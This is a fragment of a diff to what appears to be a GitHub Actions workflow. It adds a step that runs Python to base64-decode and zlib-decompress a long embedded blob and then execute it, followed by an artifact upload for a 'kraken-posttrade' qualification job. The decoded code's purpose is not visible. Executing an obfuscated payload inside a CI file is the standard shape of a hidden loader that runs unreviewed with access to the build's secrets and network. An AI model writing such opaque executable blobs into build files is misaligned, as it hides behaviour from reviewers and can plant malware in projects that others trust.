+          python -c "import base64,zlib; exec(compile(zlib.decompress(base64.b64decode('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')),'r09-embedded-5','exec'))"
+      - uses: actions/upload-artifact@v4
+        with: {name: kraken-posttrade-full-candidate-qualification, path: "${{ runner.temp }}/kraken-posttrade-full-candidate", retention-days: 7, if-no-files-found: error}
